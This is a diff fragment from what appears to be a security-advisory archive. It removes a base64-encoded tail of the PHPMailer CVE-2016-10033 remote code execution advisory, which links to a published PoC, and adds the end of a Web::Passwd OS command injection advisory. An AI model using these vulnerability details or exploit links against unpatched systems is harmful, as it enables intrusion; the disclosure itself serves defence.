-ZSBvZiB0aGUgd2ViIGFwcGxpY2F0aW9uLgoKIApWSUkuIFNZU1RFTVMgQUZG
-RUNURUQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKQWxsIHZlcnNpb25z
-IG9mIFBIUE1haWxlciBiZWZvcmUgdGhlIGNyaXRpY2FsIHJlbGVhc2Ugb2Yg
-NS4yLjE4IGFyZSBhZmZlY3RlZC4KCk5vdGUgdGhhdCBleHBsb2l0YXRpb24g
-aXMgbm90IGxpbWl0ZWQgdG8gc3lzdGVtcyB3aXRoIFNlbmRtYWlsIE1UQS4K
-CgpWSUlJLiBTT0xVVElPTgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpU
-aGUgdnVsbmVyYWJpbGl0eSB3YXMgcmVzcG9uc2libHkgZGlzY2xvc2VkIHRv
-IFBIUE1haWxlciB2ZW5kb3IuClRoZSB2ZW5kb3IgcmVsZWFzZWQgYSBjcml0
-aWNhbCBzZWN1cml0eSByZWxlYXNlIG9mIFBIUE1haWxlciA1LjIuMTggdG8g
-Zml4IHRoZQppc3N1ZSBhcyBub3RpZmllZCBhdDoKCmh0dHBzOi8vZ2l0aHVi
-LmNvbS9QSFBNYWlsZXIvUEhQTWFpbGVyL2Jsb2IvbWFzdGVyL2NoYW5nZWxv
-Zy5tZAoKaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIv
-YmxvYi9tYXN0ZXIvU0VDVVJJVFkubWQKCgpDVkUgTUlUUkUgYXNzaWduZWQg
-dGhlIGZvbGxvd2luZyBJRCB0byB0aGlzIHZ1bG5lcmFiaWxpdHk6IAoKQ1ZF
-LTIwMTYtMTAwMzMgCgpVc2VycyBzaG91bGQgdXJnZW50bHkgdXBkYXRlIHRv
-IHRoZSBwYXRjaGVkIHJlbGVhc2UuCiAKSVguIFJFRkVSRU5DRVMKLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLQoKaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29t
-CgpUaGlzIGFkdmlzb3J5OgpodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2
-aXNvcmllcy9QSFBNYWlsZXItRXhwbG9pdC1SZW1vdGUtQ29kZS1FeGVjLUNW
-RS0yMDE2LTEwMDMzLVZ1bG4uaHRtbAoKVmlkZW8gUG9DOgpodHRwczovL2xl
-Z2FsaGFja2Vycy5jb20vdmlkZW9zL1BIUE1haWxlci1FeHBsb2l0LVJlbW90
-ZS1Db2RlLUV4ZWMtVnVsbi1DVkUtMjAxNi0xMDAzMy1Qb0MuaHRtbAoKRXhw
-bG9pdCBjb2RlOgpTaW1wbGUgUG9DIHNob3duIGFib3ZlIGlzIGF2YWlsYWJs
-ZSBoZXJlOgpodHRwczovL2xlZ2FsaGFja2Vycy5jb20vZXhwbG9pdHMvQ1ZF
-LTIwMTYtMTAwMzMvUEhQTWFpbGVyLVJDRS1leHBsb2l0LXBvYy50eHQKCk90
-aGVyIGV4cGxvaXRzIHdpdGggb3RoZXIgYXR0YWNrIHZlY3RvcnMgd2lsbCBi
-ZSBkaXNjbG9zZWQgYXQgYSBsYXRlciBkYXRlIHRvIAphbGxvdyBtb3JlIHRp
-bWUgZm9yIHBhdGNoaW5nLgoKQ1ZFLTIwMTYtMTAwMzMgCmh0dHBzOi8vY3Zl
-Lm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUuY2dpP25hbWU9Q1ZFLTIwMTYt
-MTAwMzMKClBIUE1haWxlciAvIFZlbmRvciBzZWN1cml0eSB1cGRhdGVzIC8g
-bm90aWNlczoKCmh0dHBzOi8vZ2l0aHViLmNvbS9QSFBNYWlsZXIvUEhQTWFp
-bGVyL2Jsb2IvbWFzdGVyL2NoYW5nZWxvZy5tZAoKaHR0cHM6Ly9naXRodWIu
-Y29tL1BIUE1haWxlci9QSFBNYWlsZXIKCmh0dHBzOi8vZ2l0aHViLmNvbS9Q
-SFBNYWlsZXIvUEhQTWFpbGVyL2Jsb2IvbWFzdGVyL1NFQ1VSSVRZLm1kCgoK
-WC4gQ1JFRElUUwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpUaGUgdnVs
-bmVyYWJpbGl0eSBoYXMgYmVlbiBkaXNjb3ZlcmVkIGJ5IERhd2lkIEdvbHVu
-c2tpCmRhd2lkIChhdCkgbGVnYWxoYWNrZXJzIChkb3QpIGNvbQoKaHR0cHM6
-Ly9sZWdhbGhhY2tlcnMuY29tCiAKWEkuIFJFVklTSU9OIEhJU1RPUlkKLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKMjcuMTIuMjAxNiAtIFJldiAyLjA6
-IERpc2Nsb3N1cmUgb2YgYWRkaXRpb25hbCBpbmZvcm1hdGlvbiArIFNpbXBs
-ZSBQb0MKCjI1LjEyLjIwMTYgLSBMaW1pdGVkIGFkdmlzb3J5IHJlbGVhc2Vk
-IHRvIHByb21wdCBhbiB1cmdlbnQgdXBkYXRlIGJ5CmFmZmVjdGVkIHVzZXJz
-IGJlZm9yZSBkaXNjbG9zaW5nIHRoZSBkZXRhaWxzLgogCgpYSUkuIExFR0FM
-IE5PVElDRVMKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKVGhlIGluZm9y
-bWF0aW9uIGNvbnRhaW5lZCB3aXRoaW4gdGhpcyBhZHZpc29yeSBpcyBzdXBw
-bGllZCAiYXMtaXMiIHdpdGgKbm8gd2FycmFudGllcyBvciBndWFyYW50ZWVz
-IG9mIGZpdG5lc3Mgb2YgdXNlIG9yIG90aGVyd2lzZS4gSSBhY2NlcHQgbm8K
-cmVzcG9uc2liaWxpdHkgZm9yIGFueSBkYW1hZ2UgY2F1c2VkIGJ5IHRoZSB1
-c2Ugb3IgbWlzdXNlIG9mIHRoaXMgaW5mb3JtYXRpb24uCgoKCg==
+Problem types
+-------------
+- CWE-78 Improper Neutralization of Special Elements used in an OS
+   Command
 
---f403045f813ab6526f0544a2649d--
+Solutions
+---------
+This application has not been updated since 2007 and appears to have
+been abandoned. Use other solutions.
+
+
+References
+----------
+https://metacpan.org/release/EVANK/Web-Passwd-0.03
+https://httpd.apache.org/docs/current/programs/htpasswd.html
+
+Timeline
+--------
+- 2007-02-08: Web::Passwd 0.03 was released
+
+
+
